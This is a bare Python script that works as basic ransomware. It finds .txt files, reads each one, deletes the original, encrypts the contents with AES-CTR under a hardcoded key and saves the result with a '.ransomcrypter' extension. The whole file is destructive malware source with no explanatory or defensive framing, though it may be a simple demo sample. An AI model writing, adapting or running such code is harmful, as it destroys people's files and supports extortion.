import os
import glob
import pyaes
import pathlib

target_files = ["*.txt"]
try:
    desktop = pathlib.Path.home()
except Exception:
    pass

def encrypt():
    # list all files in Home    
    for files in target_files:
        # read the file content
        for format_file in glob.glob(files):
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            # remove the original file and
            # encrypts your content
            os.remove(f'{desktop}\\{format_file}')
            encrypt_key = b"somerandomkeylol"
            aes = pyaes.AESModeOfOperationCTR(encrypt_key)
            data_encrypted = aes.encrypt(file_data)

            # save the new file
            encrypt_file = format_file + ".ransomcrypter"
            encrypt_file = open(f'{desktop}\\{encrypt_file}', 'wb')
            encrypt_file.write(data_encrypted)
            encrypt_file.close()

if __name__ == "__main__":
    encrypt()